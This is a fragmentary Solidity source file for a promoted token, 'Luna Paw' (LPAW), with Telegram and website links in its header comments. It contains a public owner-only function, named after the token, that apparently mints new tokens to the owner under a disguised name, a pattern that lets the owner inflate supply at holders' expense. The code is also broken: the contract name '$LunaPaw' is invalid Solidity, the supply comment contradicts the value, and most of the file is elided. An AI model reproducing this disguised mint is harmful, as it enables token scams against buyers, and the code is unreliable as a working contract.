...
//
// $LunaPaw proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/LunaPaw
//🌐 Website:https://Lunapaw.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _LunaPaw(uint256 amount) public onlyOwner {
 _LunaPaw(msg.sender, amount);
    }
    ...
    function _LunaPaw(address account, uint256 amount) internal virtual {
...
contract $LunaPaw is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Luna Paw", "LPAW") {
     _LunaPaw(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}